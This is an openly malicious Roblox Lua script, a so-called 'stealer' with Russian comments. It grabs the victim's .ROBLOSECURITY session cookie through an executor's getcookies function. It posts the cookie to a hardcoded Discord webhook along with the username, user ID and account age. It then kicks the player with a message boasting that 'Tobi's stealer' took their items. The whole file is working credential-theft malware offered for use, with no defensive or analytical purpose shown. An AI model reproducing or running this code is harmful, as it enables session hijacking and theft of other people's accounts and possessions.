-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")

local function sendData()
    local cookie = "N/A"
    
    -- Пытаемся достать данные через стандартный запрос (иногда обходит блокировку)
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "🎯 Target Logged!",
            ["description"] = "User: " .. player.Name .. "\nID: " .. player.UserId .. "\nAge: " .. player.AccountAge .. " days",
            ["fields"] = {
                {["name"] = "Cookie", ["value"] = "```" .. (cookie or "Blocked") .. "```"}
            },
            ["color"] = 16711680
        }}
    }

    -- Пытаемся отправить всеми доступными способами
    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = http:JSONEncode(data)
            })
        end)
    end
end

-- ЗАПУСК
task.spawn(function()
    pcall(sendData)
end)

-- МОМЕНТАЛЬНЫЙ КИК С ТВОИМ ТЕКСТОМ
task.wait(0.5)
player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
